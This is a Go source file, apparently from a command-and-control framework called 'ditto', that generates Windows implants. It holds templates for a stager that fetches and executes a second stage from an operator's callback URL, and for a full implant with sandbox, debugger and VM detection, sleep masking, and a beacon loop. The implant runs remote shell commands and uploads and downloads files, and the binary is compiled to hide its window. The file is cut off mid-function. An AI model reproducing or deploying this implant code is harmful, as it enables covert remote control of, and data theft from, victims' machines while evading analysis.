package payload

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/crypto"
	"github.com/ditto/ditto/evasion"
	"github.com/ditto/ditto/modules"
)

// Options holds payload generation options
type Options struct {
	Type             string
	Arch             string
	OS               string
	Encrypt          bool
	Obfuscate        bool
	EntropyPolymorph bool // Enable novel entropy-driven polymorphic code (non-human reasoning)
	Debug            bool // Enable debug mode (console window, verbose logging, no obfuscation)
	Config           *core.Config
	CallbackURL      string         // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
	Delay            int            // Beacon delay in seconds (default: 30)
	Jitter           float64        // Jitter percentage (0.0-1.0, default: 0.0)
	UserAgent        string         // Custom user agent (default: auto-generated)
	Protocol         string         // Protocol: http, https, mtls (default: http)
	Modules          []string       // Empire module IDs to embed
	Evasion          *EvasionConfig // Evasion features to enable
}

// EvasionConfig holds evasion feature configuration
type EvasionConfig struct {
	EnableSandboxDetection bool
	EnableDebuggerCheck    bool
	EnableVMDetection      bool
	EnableETWPatches       bool
	EnableAMSI             bool
	SleepMask              bool
	DirectSyscalls         bool
}

// Generator handles payload generation
type Generator struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	moduleRegistry *modules.ModuleRegistry
}

// NewGenerator creates a new payload generator
func NewGenerator(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, moduleRegistry *modules.ModuleRegistry) *Generator {
	return &Generator{
		logger:         logger,
		moduleRegistry: moduleRegistry,
	}
}

// Generate creates a payload based on options
func (g *Generator) Generate(opts Options) ([]byte, error) {
	g.logger.Info("Generating %s payload for %s/%s", opts.Type, opts.OS, opts.Arch)

	// For Windows executables, we need to actually compile Go code
	if opts.OS == "windows" && (opts.Type == "stager" || opts.Type == "full") {
		return g.generateWindowsExecutable(opts)
	}

	var payloadData []byte
	var err error

	switch opts.Type {
	case "stager":
		payloadData, err = g.generateStager(opts)
	case "shellcode":
		payloadData, err = g.generateShellcode(opts)
	case "full":
		payloadData, err = g.generateFull(opts)
	default:
		return nil, fmt.Errorf("unknown payload type: %s", opts.Type)
	}

	if err != nil {
		return nil, fmt.Errorf("payload generation failed: %w", err)
	}

	// Apply obfuscation if requested (but not in debug mode)
	if opts.Obfuscate && !opts.Debug {
		if opts.EntropyPolymorph {
			g.logger.Debug("Applying entropy-driven polymorphic transformation (novel non-human reasoning)")
			payloadData = evasion.ApplyEntropyPolymorphism(payloadData)
		} else {
			g.logger.Debug("Applying standard obfuscation")
			payloadData = evasion.ObfuscateCode(payloadData)
		}
	} else if opts.Debug {
		g.logger.Debug("Debug mode enabled - skipping obfuscation")
	}

	// Apply encryption if requested
	if opts.Encrypt {
		g.logger.Debug("Applying encryption")
		encrypted, err := g.encryptPayload(payloadData, opts.Config)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
		payloadData = encrypted
	}

	// Compress if enabled
	if opts.Config.Encryption.Compression {
		g.logger.Debug("Applying compression")
		compressed, err := compressData(payloadData)
		if err != nil {
			return nil, fmt.Errorf("compression failed: %w", err)
		}
		payloadData = compressed
	}

	g.logger.Info("Payload generated successfully: %d bytes", len(payloadData))
	return payloadData, nil
}

func (g *Generator) generateStager(opts Options) ([]byte, error) {
	// Stager payload - minimal initial loader
	stagerTemplate := `
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"net/http"
	"time"
)

const (
	callbackURL = "%s"
	encKey      = "%s"
)

func main() {
	// Stage 1: Download and decrypt second stage
	data := downloadStage(callbackURL)
	decrypted := decrypt(data, encKey)
	executeStage(decrypted)
}

func downloadStage(url string) []byte {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	return data
}

func decrypt(data []byte, key string) []byte {
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

func executeStage(stage []byte) {
	// Platform-specific execution
	%s
}
`

	// Generate execution method based on OS
	var execCode string
	switch opts.OS {
	case "windows":
		execCode = `syscall.Syscall(uintptr(unsafe.Pointer(&stage[0])), 0, 0, 0, 0)`
	case "linux", "darwin":
		execCode = `syscall.Mprotect(stage, syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC)`
	default:
		execCode = `// Direct execution`
	}

	payload := fmt.Sprintf(stagerTemplate,
		opts.Config.Communication.Protocol,
		string(opts.Config.Session.Key)[:16],
		execCode)

	return []byte(payload), nil
}

func (g *Generator) generateShellcode(opts Options) ([]byte, error) {
	// Generate platform-specific shellcode
	var shellcode []byte

	switch opts.OS {
	case "windows":
		shellcode = generateWindowsShellcode(opts.Arch)
	case "linux":
		shellcode = generateLinuxShellcode(opts.Arch)
	case "darwin":
		shellcode = generateDarwinShellcode(opts.Arch)
	default:
		return nil, fmt.Errorf("unsupported OS: %s", opts.OS)
	}

	return shellcode, nil
}

func (g *Generator) generateFull(opts Options) ([]byte, error) {
	// Full payload with all capabilities
	// This would combine stager + shellcode + all modules
	stager, err := g.generateStager(opts)
	if err != nil {
		return nil, err
	}

	shellcode, err := g.generateShellcode(opts)
	if err != nil {
		return nil, err
	}

	// Combine payloads
	fullPayload := append(stager, shellcode...)
	return fullPayload, nil
}

func (g *Generator) encryptPayload(data []byte, cfg *core.Config) ([]byte, error) {
	key := make([]byte, cfg.Encryption.KeySize)
	if len(cfg.Session.Key) >= cfg.Encryption.KeySize {
		copy(key, cfg.Session.Key[:cfg.Encryption.KeySize])
	} else {
		copy(key, cfg.Session.Key)
	}

	switch cfg.Encryption.Algorithm {
	case "aes256":
		return crypto.AES256Encrypt(data, key)
	case "chacha20":
		return crypto.ChaCha20Encrypt(data, key)
	default:
		return nil, fmt.Errorf("unsupported algorithm: %s", cfg.Encryption.Algorithm)
	}
}

func compressData(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	
	if _, err := w.Write(data); err != nil {
		w.Close() // Cleanup on error
		return nil, err
	}
	// Close() finalizes the gzip stream - must be called
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// Platform-specific shellcode generators
// NOTE: These are placeholder implementations. For production use, generate shellcode
// using external tools (msfvenom, Cobalt Strike, etc.) or implement proper shellcode generation.
func generateWindowsShellcode(arch string) []byte {
	// Placeholder shellcode - NOT FUNCTIONAL
	// This is a minimal stub that will fail at runtime
	// Real shellcode should be generated using msfvenom or similar tools
	if arch == "amd64" {
		return []byte{} // Return empty - will cause error
	}
	return []byte{} // Return empty - will cause error
}

func generateLinuxShellcode(arch string) []byte {
	// Placeholder shellcode - NOT FUNCTIONAL
	// Real shellcode should be generated using msfvenom or similar tools
	if arch == "amd64" {
		return []byte{} // Return empty - will cause error
	}
	return []byte{} // Return empty - will cause error
}

func generateDarwinShellcode(arch string) []byte {
	// Placeholder shellcode - NOT FUNCTIONAL
	// Real shellcode should be generated using msfvenom or similar tools
	if arch == "amd64" {
		return []byte{} // Return empty - will cause error
	}
	return []byte{} // Return empty - will cause error
}

// generateWindowsExecutable compiles a proper Windows PE executable using Go build
func (g *Generator) generateWindowsExecutable(opts Options) ([]byte, error) {
	// Create temporary directory for build
	tmpDir, err := os.MkdirTemp("", "ditto_build_*")
	if err != nil {
		return nil, fmt.Errorf("failed to create temp directory: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Generate Go source code
	sourceCode, err := g.generateWindowsSource(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to generate source: %w", err)
	}

	// Write main.go
	mainGoPath := filepath.Join(tmpDir, "main.go")
	if err := os.WriteFile(mainGoPath, sourceCode, 0644); err != nil {
		return nil, fmt.Errorf("failed to write source: %w", err)
	}

	// Initialize go.mod with required dependencies
	goModContent := `module ditto-implant

go 1.21
`
	goModPath := filepath.Join(tmpDir, "go.mod")
	if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write go.mod: %w", err)
	}

	// Set cross-compilation environment
	env := os.Environ()
	env = append(env, "GOOS=windows")
	if opts.Arch == "amd64" {
		env = append(env, "GOARCH=amd64")
	} else if opts.Arch == "386" {
		env = append(env, "GOARCH=386")
	} else {
		return nil, fmt.Errorf("unsupported Windows architecture: %s", opts.Arch)
	}
	env = append(env, "CGO_ENABLED=0")

	// Download dependencies before building
	// Always download golang.org/x/sys/windows for Windows payloads (needed for SysProcAttr.HideWindow)
	// Also download if evasion features are enabled (they require unsafe and windows)
	g.logger.Debug("Downloading Go dependencies...")
	getCmd := exec.Command("go", "get", "golang.org/x/sys/windows@latest")
	getCmd.Dir = tmpDir
	getCmd.Env = env
	var modStderr bytes.Buffer
	getCmd.Stderr = &modStderr
	if err := getCmd.Run(); err != nil {
		return nil, fmt.Errorf("failed to download dependencies: %w\nStderr: %s", err, modStderr.String())
	}

	// Then run go mod tidy to ensure everything is correct
	tidyCmd := exec.Command("go", "mod", "tidy")
	tidyCmd.Dir = tmpDir
	tidyCmd.Env = env
	tidyCmd.Stderr = &modStderr
	if err := tidyCmd.Run(); err != nil {
		// Non-fatal - continue if tidy fails
		g.logger.Debug("go mod tidy had warnings: %s", modStderr.String())
	}

	// Determine output name
	outputName := "implant.exe"
	if opts.Arch == "amd64" {
		outputName = "implant.exe"
	} else if opts.Arch == "386" {
		outputName = "implant.exe"
	}
	outputPath := filepath.Join(tmpDir, outputName)

	// Build command - conditionally hide console window based on debug flag
	// Use -H windowsgui to compile as Windows GUI application (no console window)
	ldflags := "-s -w"
	if !opts.Debug {
		ldflags += " -H windowsgui"
	}
	cmd := exec.Command("go", "build", "-o", outputPath, "-ldflags", ldflags, ".")
	cmd.Dir = tmpDir
	cmd.Env = env

	// Run build
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("go build failed: %w\nStderr: %s", err, stderr.String())
	}

	// Read compiled binary
	binaryData, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read compiled binary: %w", err)
	}

	g.logger.Info("Windows executable compiled successfully: %d bytes", len(binaryData))
	return binaryData, nil
}

// generateWindowsSource generates proper Go source code for Windows implant
func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
	// Format callback URL
	callbackURL := opts.CallbackURL
	if callbackURL == "" {
		// Fallback to config or default
		if opts.Config != nil && opts.Config.Communication.Protocol != "" {
			callbackURL = opts.Config.Communication.Protocol
		} else {
			callbackURL = "http://localhost:8443"
		}
	}

	// Ensure URL has protocol
	if !strings.HasPrefix(callbackURL, "http://") && !strings.HasPrefix(callbackURL, "https://") {
		// Auto-detect protocol or use configured one
		if opts.Protocol == "https" || opts.Protocol == "mtls" {
			callbackURL = "https://" + callbackURL
		} else {
			callbackURL = "http://" + callbackURL
		}
	}

	// Set delay and jitter defaults
	delay := opts.Delay
	if delay == 0 {
		delay = 10 // Default 10 seconds
	}
	jitter := opts.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 1.0 {
		jitter = 1.0
	}

	// Set user agent
	userAgent := opts.UserAgent
	if userAgent == "" {
		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}

	var source string
	if opts.Type == "full" {
		var err error
		source, err = g.generateWindowsSourceFull(opts, callbackURL, delay, jitter, userAgent)
		if err != nil {
			return nil, err
		}
	} else {
		// Stager template
		stagerTemplate := `package main

import (
	"net/http"
	"time"
	"os"
	"runtime"
)

const (
	callbackURL = "%s"
	userAgent   = "%s"
)

func main() {
	// Avoid detection
	if runtime.GOOS != "windows" {
		os.Exit(1)
	}
	
	// Download and execute second stage
	downloadAndExecute()
}

func downloadAndExecute() {
	client := &http.Client{
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("GET", callbackURL+"/stage2", nil)
	if err != nil {
		return
	}
	
	req.Header.Set("User-Agent", userAgent)
	
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 200 {
		// In a real implementation, this would download and execute second stage
		// For now, just acknowledge receipt
		_ = resp // Use response
	}
}
`
		source = fmt.Sprintf(stagerTemplate, callbackURL, userAgent)
	}
	return []byte(source), nil
}

// TemplateData holds data for template generation
type TemplateData struct {
	CallbackURL string
	Delay       int
	Jitter      float64
	UserAgent   string
	Evasion     *EvasionConfig
	Modules     []string
	ModuleCode  string // Embedded module code
	Debug       bool   // Enable debug mode
}

// generateWindowsSourceFull generates full payload source with evasion and modules
func (g *Generator) generateWindowsSourceFull(opts Options, callbackURL string, delay int, jitter float64, userAgent string) (string, error) {
	tmpl := `package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"{{if and .Evasion (or .Evasion.EnableSandboxDetection .Evasion.EnableDebuggerCheck .Evasion.EnableVMDetection)}}
	"unsafe"{{end}}
	
	"github.com/praetorian-inc/goffloader/src/coff"
	"golang.org/x/sys/windows"
)

const (
	callbackURL = "{{.CallbackURL}}"
	delay       = {{.Delay}}
	jitter      = {{.Jitter}}
	userAgent   = "{{.UserAgent}}"
)

var (
	sessionID string
	sessionMu sync.Mutex
	currentDelay float64 = float64(delay)
	currentJitter float64 = jitter
)

// debugLog formats debug messages with timestamp
func debugLog(format string, v ...interface{}) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	message := fmt.Sprintf(format, v...)
	fmt.Printf("[%s] [DEBUG] %s\n", timestamp, message)
}

func main() {
	{{if .Debug}}
	// DEBUG MODE: Console window visible for troubleshooting
	debugLog("Ditto Implant Starting...")
	debugLog("Callback URL: %s", callbackURL)
	debugLog("Delay: %d seconds", delay)
	debugLog("Jitter: %.2f%%", jitter*100.0)
	{{end}}
	
	// Avoid detection
	if runtime.GOOS != "windows" {
		{{if .Debug}}
		debugLog("ERROR: Not running on Windows, exiting")
		{{end}}
		os.Exit(1)
	}
	
	{{if and .Evasion .Evasion.EnableSandboxDetection}}
	// Sandbox detection
	if checkSandbox() {
		{{if .Debug}}
		debugLog("Sandbox detected, exiting")
		{{end}}
		os.Exit(0)
	}
	{{end}}
	
	{{if and .Evasion .Evasion.EnableDebuggerCheck}}
	// Debugger detection
	if checkDebugger() {
		{{if .Debug}}
		debugLog("Debugger detected, exiting")
		{{end}}
		os.Exit(0)
	}
	{{end}}
	
	{{if and .Evasion .Evasion.EnableVMDetection}}
	// VM detection
	if checkVM() {
		{{if .Debug}}
		debugLog("VM detected, exiting")
		{{end}}
		os.Exit(0)
	}
	{{end}}
	
	{{if .Debug}}
	debugLog("Starting beacon loop...")
	{{end}}
	
	// Beacon loop with adaptive jitter
	for {
		beacon()
		// Calculate jitter: ±currentJitter% around currentDelay
		// rand.Float64()*2.0-1.0 gives range [-1.0, 1.0]
		jitterMultiplier := 1.0 + currentJitter*(rand.Float64()*2.0-1.0)
		sleepSeconds := currentDelay * jitterMultiplier
		// Ensure minimum sleep of 0.5 seconds
		if sleepSeconds < 0.5 {
			sleepSeconds = 0.5
		}
		sleepDuration := time.Duration(sleepSeconds * float64(time.Second))
		{{if .Debug}}
		debugLog("Sleeping for %.2fs before next beacon (delay=%.2f, jitter=%.2f%%)", sleepSeconds, currentDelay, currentJitter*100)
		{{end}}
		{{if and .Evasion .Evasion.SleepMask}}
		// Sleep mask evasion
		sleepMask(sleepDuration)
		{{else}}
		time.Sleep(sleepDuration)
		{{end}}
	}
}

{{if and .Evasion .Evasion.EnableSandboxDetection}}
func checkSandbox() bool {
	// Basic checks
	if runtime.NumCPU() < 2 {
		return true
	}
	
	// Advanced Veil-style sandbox detection
	// Check cursor movement (Veil technique)
	if checkCursorMovement() {
		return true
	}
	
	// Check VM files/DLLs (Veil technique)
	if checkVMFiles() {
		return true
	}
	
	return false
}

// checkCursorMovement detects if cursor moved (Veil technique)
func checkCursorMovement() bool {
	user32 := windows.NewLazyDLL("user32.dll")
	getCursorPos := user32.NewProc("GetCursorPos")
	
	type POINT struct {
		X, Y int32
	}
	
	var pt1 POINT
	ret1, _, _ := getCursorPos.Call(uintptr(unsafe.Pointer(&pt1)))
	if ret1 == 0 {
		return false
	}
	
	// Wait 30 seconds
	time.Sleep(30 * time.Second)
	
	var pt2 POINT
	ret2, _, _ := getCursorPos.Call(uintptr(unsafe.Pointer(&pt2)))
	if ret2 == 0 {
		return false
	}
	
	// If cursor didn't move, likely in sandbox
	return pt1.X == pt2.X && pt1.Y == pt2.Y
}

// checkVMFiles checks for VM-specific files and DLLs (Veil technique)
func checkVMFiles() bool {
	vmFiles := []string{
		"C:\\windows\\Sysnative\\Drivers\\Vmmouse.sys",
		"C:\\windows\\Sysnative\\Drivers\\vboxguest.sys",
		"C:\\windows\\Sysnative\\Drivers\\VBoxMouse.sys",
		"C:\\windows\\Sysnative\\Drivers\\VBoxGuest.sys",
		"C:\\windows\\Sysnative\\Drivers\\VBoxSF.sys",
		"C:\\windows\\Sysnative\\Drivers\\VBoxVideo.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmhgfs.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmci.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmx_svga.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmxnet.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmrawdsk.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmusbmouse.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmwaremouse.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmwareguest.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmwarevmmem.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmwarevideo.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmwaretoolbox.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmwarevmci.sys",
		"C:\\windows\\Sysnative\\Drivers\\vmwarevmx86.sys",
		"C:\\windows\\Sysnative\\Drivers\\qemu-ga.sys",
	}
	
	vmDLLs := []string{
		"sbiedll.dll",
		"api_log.dll",
		"dir_watch.dll",
		"vmcheck.dll",
		"wpespy.dll",
		"fakenet.dll",
		"pstorec.dll",
		"vmsrvc.dll",
		"vmtools.dll",
		"vmwarebase.dll",
		"vboxguest.dll",
		"vboxmouse.dll",
		"vboxservice.dll",
		"vboxsf.dll",
		"qemu-ga.dll",
	}
	
	// Check VM files
	for _, file := range vmFiles {
		if _, err := os.Stat(file); err == nil {
			return true
		}
	}
	
	// Check loaded DLLs via PEB walking (simplified)
	// In production, would use NtQueryInformationProcess and enumerate modules
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	enumProcessModules := kernel32.NewProc("K32EnumProcessModules")
	getModuleFileNameEx := kernel32.NewProc("K32GetModuleFileNameExW")
	
	if enumProcessModules != nil && getModuleFileNameEx != nil {
		processHandle := windows.CurrentProcess()
		var modules [1024]uintptr
		var needed uint32
		
		ret, _, _ := enumProcessModules.Call(
			uintptr(processHandle),
			uintptr(unsafe.Pointer(&modules[0])),
			uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
			uintptr(unsafe.Pointer(&needed)),
		)
		
		if ret != 0 {
			moduleCount := int(needed) / int(unsafe.Sizeof(modules[0]))
			for i := 0; i < moduleCount && i < len(modules); i++ {
				var filename [260]uint16
				ret, _, _ := getModuleFileNameEx.Call(
					uintptr(processHandle),
					modules[i],
					uintptr(unsafe.Pointer(&filename[0])),
					260,
				)
				
				if ret != 0 {
					modulePath := windows.UTF16ToString(filename[:])
					for _, vmDLL := range vmDLLs {
						if strings.Contains(strings.ToLower(modulePath), strings.ToLower(vmDLL)) {
							return true
						}
					}
				}
			}
		}
	}
	
	return false
}
{{end}}

{{if and .Evasion .Evasion.EnableDebuggerCheck}}
func checkDebugger() bool {
	// Check for common debugger processes (Windows)
	if runtime.GOOS == "windows" {
		debuggers := []string{"ollydbg.exe", "x64dbg.exe", "windbg.exe", "ida.exe", "ida64.exe", "wireshark.exe", "fiddler.exe"}
		for _, dbg := range debuggers {
			cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", dbg))
			output, _ := cmd.CombinedOutput()
			if strings.Contains(strings.ToLower(string(output)), strings.ToLower(dbg)) {
				return true
			}
		}
		
		// Check NtQueryInformationProcess for BeingDebugged flag
		// This is a simplified check - in production would use syscalls
		cmd := exec.Command("powershell", "-Command", "[System.Diagnostics.Debugger]::IsAttached")
		output, _ := cmd.CombinedOutput()
		if strings.Contains(string(output), "True") {
			return true
		}
	}
	return false
}
{{end}}

{{if and .Evasion .Evasion.EnableVMDetection}}
func checkVM() bool {
	if runtime.GOOS == "windows" {
		// Check registry for VM artifacts
		vmKeys := []string{
			"HKLM\\SOFTWARE\\VMware\\VMware Tools",
			"HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
			"HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest",
			"HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse",
		}
		for _, key := range vmKeys {
			cmd := exec.Command("reg", "query", key)
			if err := cmd.Run(); err == nil {
				return true
			}
		}
		
		// Check MAC addresses
		cmd := exec.Command("getmac", "/fo", "csv")
		output, _ := cmd.CombinedOutput()
		mac := string(output)
		vmPrefixes := []string{"00:0c:29", "00:50:56", "08:00:27", "00:16:3e"}
		for _, prefix := range vmPrefixes {
			if strings.Contains(mac, prefix) {
				return true
			}
		}
		
		// Check for VM processes
		vmProcesses := []string{"vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe"}
		for _, proc := range vmProcesses {
			cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", proc))
			output, _ := cmd.CombinedOutput()
			if strings.Contains(strings.ToLower(string(output)), strings.ToLower(proc)) {
				return true
			}
		}
	}
	return false
}
{{end}}

{{if and .Evasion .Evasion.SleepMask}}
func sleepMask(duration time.Duration) {
	// Sleep mask evasion - split sleep into smaller chunks with jitter
	chunks := int(duration.Milliseconds() / 100)
	if chunks < 1 {
		chunks = 1
	}
	chunkDuration := duration / time.Duration(chunks)
	
	for i := 0; i < chunks; i++ {
		// Add small random jitter to each chunk
		jitter := time.Duration(rand.Intn(50)) * time.Millisecond
		time.Sleep(chunkDuration + jitter)
	}
}
{{end}}

func beacon() {
	{{if .Debug}}
	debugLog("Sending beacon request...")
	debugLog("Request URL: %s/beacon", callbackURL)
	{{end}}
	
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	
	req, err := http.NewRequest("GET", callbackURL+"/beacon", nil)
	if err != nil {
		{{if .Debug}}
		debugLog("ERROR: Failed to create beacon request: %v", err)
		{{end}}
		return
	}
	
	req.Header.Set("User-Agent", userAgent)
	
	// Send session ID if we have one
	sessionMu.Lock()
	if sessionID != "" {
		req.Header.Set("X-Session-ID", sessionID)
		{{if .Debug}}
		debugLog("Sending session ID: %s", sessionID)
		{{end}}
	} else {
		{{if .Debug}}
		debugLog("No session ID yet (first beacon)")
		{{end}}
	}
	sessionMu.Unlock()
	
	{{if .Debug}}
	debugLog("Request headers: User-Agent=%s, X-Session-ID=%s", userAgent, req.Header.Get("X-Session-ID"))
	{{end}}
	
	resp, err := client.Do(req)
	if err != nil {
		{{if .Debug}}
		debugLog("ERROR: Beacon request failed: %v", err)
		{{end}}
		return
	}
	defer resp.Body.Close()
	
	{{if .Debug}}
	debugLog("Beacon response status: %d", resp.StatusCode)
	debugLog("Response headers: %v", resp.Header)
	{{end}}
	
	// Handle commands
	if resp.StatusCode == 200 {
		var response map[string]interface{}
		if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
			{{if .Debug}}
			debugLog("ERROR: Failed to decode response: %v", err)
			{{end}}
			return
		}
		
		{{if .Debug}}
		debugLog("Response body: %+v", response)
		{{end}}
		
		// Store session ID from response
		if sid, ok := response["session_id"].(string); ok && sid != "" {
			sessionMu.Lock()
			{{if .Debug}}
			oldSessionID := sessionID
			sessionID = sid
			if oldSessionID != sid {
				debugLog("Received new session ID: %s", sid)
			}
			{{else}}
			sessionID = sid
			{{end}}
			sessionMu.Unlock()
		}
		
		if tasks, ok := response["tasks"].([]interface{}); ok {
			{{if .Debug}}
			debugLog("Received %d tasks", len(tasks))
			for i, task := range tasks {
				debugLog("Task %d: %+v", i, task)
			}
			{{end}}
			for _, task := range tasks {
				if taskMap, ok := task.(map[string]interface{}); ok {
					executeTask(taskMap)
				}
			}
		}
		
		if sleep, ok := response["sleep"].(float64); ok {
			// Update delay from server response (adaptive sleep)
			currentDelay = sleep
			{{if .Debug}}
			debugLog("Server sleep interval: %.2f seconds", sleep)
			{{end}}
		}
		
		if jitterVal, ok := response["jitter"].(float64); ok {
			// Update jitter from server response
			currentJitter = jitterVal
			{{if .Debug}}
			debugLog("Server jitter: %.2f%%", jitterVal*100)
			{{end}}
		}
	} else {
		{{if .Debug}}
		debugLog("Beacon returned non-200 status: %d", resp.StatusCode)
		{{end}}
	}
}

func executeTask(task map[string]interface{}) {
	taskType, _ := task["type"].(string)
	taskID, _ := task["id"].(string)
	
	{{if .Debug}}
	debugLog("Executing task: id=%s, type=%s", taskID, taskType)
	{{end}}
	
	switch taskType {
	case "shell":
		if cmd, ok := task["command"].(string); ok {
			executeShellCommand(taskID, cmd)
		}
	case "kill":
		{{if .Debug}}
		debugLog("Kill command received, terminating implant...")
		{{end}}
		// Send result before exiting (best effort)
		sendResult("kill", taskID, "Implant terminating...")
		// Give a moment for result to be sent
		time.Sleep(500 * time.Millisecond)
		// Terminate the implant process
		os.Exit(0)
	case "migrate":
		if pidStr, ok := task["command"].(string); ok {
			executeMigrate(taskID, pidStr)
		} else if params, ok := task["parameters"].(map[string]interface{}); ok {
			if pidVal, ok := params["pid"]; ok {
				pidStr := fmt.Sprintf("%v", pidVal)
				executeMigrate(taskID, pidStr)
			} else {
				sendResult("migrate", taskID, "Error: Process ID not provided in migrate task")
			}
		} else {
			sendResult("migrate", taskID, "Error: Process ID not provided in migrate task")
		}
	case "module":
		if moduleID, ok := task["module_id"].(string); ok {
			executeModule(taskID, moduleID, task)
		} else if moduleID, ok := task["command"].(string); ok {
			// Fallback to command field if module_id not present
			executeModule(taskID, moduleID, task)
		}
	case "download":
		if path, ok := task["path"].(string); ok {
			downloadFile(taskID, path)
		} else if path, ok := task["command"].(string); ok {
			// Fallback to command field if path not present
			downloadFile(taskID, path)
		}
	case "upload":
		if path, ok := task["path"].(string); ok {
			if data, ok := task["data"].(string); ok {
				uploadFile(taskID, path, data)
			}
		}
	default:
		{{if .Debug}}
		debugLog("Unknown task type: %s", taskType)
		{{end}}
		sendResult(taskType, taskID, fmt.Sprintf("Error: Unknown task type: %s", taskType))
	}
}

func executeShellCommand(taskID, cmd string) {
	{{if .Debug}}
	debugLog("Executing shell command: id=%s, cmd=%s", taskID, cmd)
	{{end}}
	
	// Execute shell command and send result back
	result := executeCommand(cmd)
	sendResult("shell", taskID, result)
}

func executeMigrate(taskID, pidStr string) {
	{{if .Debug}}
	debugLog("Migrate command received: id=%s, pid=%s", taskID, pidStr)
	{{end}}
	
	// Process migration is not yet implemented in Go implants
	// Migration requires:
	// 1. Generating shellcode for a new implant instance
	// 2. Opening the target process with PROCESS_ALL_ACCESS
	// 3. Allocating memory in the remote process (VirtualAllocEx)
	// 4. Writing shellcode to remote memory (WriteProcessMemory)
	// 5. Creating remote thread to execute shellcode (CreateRemoteThread)
	// 6. Waiting for migration to complete
	// 
	// This feature requires significant Windows API integration and is planned for future implementation
	sendResult("migrate", taskID, fmt.Sprintf("Error: Process migration is not yet implemented. Requested PID: %s\n"+
		"Migration requires shellcode generation and process injection APIs that are not currently available in the Go implant.", pidStr))
}

// packBOFArguments packs BOF arguments according to format string
func packBOFArguments(formatString string, args []string) ([]byte, error) {
	if len(formatString) != len(args) {
		return nil, fmt.Errorf("format string length (%d) must match arguments length (%d)", len(formatString), len(args))
	}
	
	buffer := new(bytes.Buffer)
	
	for i, c := range formatString {
		arg := args[i]
		
		switch c {
		case 'b':
			// Binary data - base64 decode
			data, err := base64.StdEncoding.DecodeString(arg)
			if err != nil {
				return nil, fmt.Errorf("invalid binary data at position %d: %v", i, err)
			}
			if err := binary.Write(buffer, binary.LittleEndian, uint32(len(data))); err != nil {
				return nil, err
			}
			buffer.Write(data)
		case 'i':
			// 4-byte signed integer
			var val int32
			if _, err := fmt.Sscanf(arg, "%d", &val); err != nil {
				return nil, fmt.Errorf("invalid integer at position %d: %v", i, err)
			}
			binary.Write(buffer, binary.LittleEndian, val)
		case 's':
			// 2-byte signed short
			var val int16
			if _, err := fmt.Sscanf(arg, "%d", &val); err != nil {
				return nil, fmt.Errorf("invalid short at position %d: %v", i, err)
			}
			binary.Write(buffer, binary.LittleEndian, val)
		case 'z':
			// UTF-8 string
			strBytes := append([]byte(arg), 0x00)
			binary.Write(buffer, binary.LittleEndian, uint32(len(strBytes)))
			buffer.Write(strBytes)
		case 'Z':
			// UTF-16LE string
			utf16Data := []byte{}
			for _, r := range arg {
				utf16Data = append(utf16Data, byte(r), byte(r>>8))
			}
			utf16Data = append(utf16Data, 0x00, 0x00)
